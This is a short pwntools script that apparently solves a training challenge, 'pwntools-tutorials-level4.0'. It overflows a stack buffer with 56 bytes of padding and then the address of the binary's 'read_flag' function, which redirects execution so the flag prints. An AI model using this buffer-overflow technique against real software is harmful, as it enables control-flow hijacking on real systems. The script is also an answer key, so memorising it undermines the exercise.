from pwn import *

context(arch="amd64", os="linux", log_level="info")

challenge_path = "/challenge/pwntools-tutorials-level4.0"
elf = ELF(challenge_path)

# Get read_flag function address
win_addr = elf.symbols['read_flag']
info(f"read_flag at: {hex(win_addr)}")

# Build exploit payload with offset 56
payload = b'A' * 56 + p64(win_addr)

# Send exploit
p = process(challenge_path)
p.recvuntil(b"Give me your input\n")
p.sendline(payload)

# Get the flag
print(p.recvall(timeout=2).decode())
